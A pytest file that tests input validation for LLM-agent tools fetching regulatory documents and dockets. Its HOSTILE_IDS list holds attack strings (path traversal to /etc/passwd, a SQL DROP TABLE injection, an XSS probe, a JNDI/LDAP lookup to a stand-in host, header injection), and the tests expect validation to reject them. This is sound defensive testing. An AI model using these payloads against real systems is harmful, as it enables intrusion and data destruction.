"""Adversarial input tests.

Tool inputs arrive from an LLM agent, which may itself be acting on
untrusted user text. Validation must reject hostile or malformed input
before it reaches the network or the URL path.

The document and docket ID patterns restrict input to alphanumeric segments
separated by hyphens. These tests confirm that restriction holds against
injection-style payloads.
"""

import pytest
from pydantic import ValidationError

from src.models import (
    CommentRequirementsInput,
    DocketDetailInput,
    DocumentDetailInput,
    SearchInput,
)

# Payloads representative of common injection and traversal attempts. None
# should pass ID validation, because the pattern permits only alphanumeric
# segments joined by hyphens.
HOSTILE_IDS = [
    "../../../etc/passwd",
    "..\\..\\windows\\system32",
    "FDA-2021-N-0270-0001/../../../admin",
    "'; DROP TABLE documents; --",
    "<script>alert(1)</script>",
    "FDA-2021-N-0270-0001?filter[agencyId]=X",
    "FDA-2021-N-0270-0001&page[size]=99999",
    "FDA-2021-N-0270-0001%00",
    "FDA 2021 N 0270 0001",
    "${jndi:ldap://example.com/a}",
    "FDA-2021-N-0270-0001\nX-Injected-Header: value",
    "https://evil.example.com/FDA-2021-N-0270-0001",
    "A" * 5000,
]


@pytest.mark.parametrize("payload", HOSTILE_IDS)
def test_document_id_rejects_hostile_input(payload):
    """No injection or traversal payload passes document ID validation."""
    with pytest.raises(ValidationError):
        DocumentDetailInput(document_id=payload)


@pytest.mark.parametrize("payload", HOSTILE_IDS)
def test_docket_id_rejects_hostile_input(payload):
    """No injection or traversal payload passes docket ID validation."""
    with pytest.raises(ValidationError):
        DocketDetailInput(docket_id=payload)


@pytest.mark.parametrize("payload", HOSTILE_IDS)
def test_comment_requirements_rejects_hostile_input(payload):
    """The comment tool applies the same ID restriction."""
    with pytest.raises(ValidationError):
        CommentRequirementsInput(document_id=payload)


# Search accepts free text by design, so the ID pattern does not apply.
# These confirm the bounded parameters cannot be driven out of range.


def test_search_page_size_cannot_be_inflated():
    """An oversized page_size is rejected rather than forwarded upstream."""
    with pytest.raises(ValidationError):
        SearchInput(search_term="test", page_size=999999)


def test_search_page_size_cannot_be_negative():
    """A negative page_size is rejected."""
    with pytest.raises(ValidationError):
        SearchInput(search_term="test", page_size=-1)


def test_search_page_size_cannot_be_zero():
    """A zero page_size is rejected; the upstream minimum is five."""
    with pytest.raises(ValidationError):
        SearchInput(search_term="test", page_size=0)


def test_search_term_accepts_free_text_by_design():
    """Search terms are user text and are not pattern-restricted.

    Documented deliberately: search_term is passed as a query parameter, not
    a URL path segment, and requests handles encoding. Restricting it would
    break legitimate searches containing punctuation.
    """
    inp = SearchInput(search_term="section 508 & accessibility (2026)")
    assert inp.search_term == "section 508 & accessibility (2026)"


def test_search_term_with_injection_syntax_is_treated_as_text():
    """Injection-style syntax in a search term is data, not instruction.

    The term is sent as a filter parameter value. It cannot alter the
    request structure because the base URL and parameter names are fixed in
    the client.
    """
    inp = SearchInput(search_term="'; DROP TABLE documents; --")
    assert "DROP TABLE" in inp.search_term
    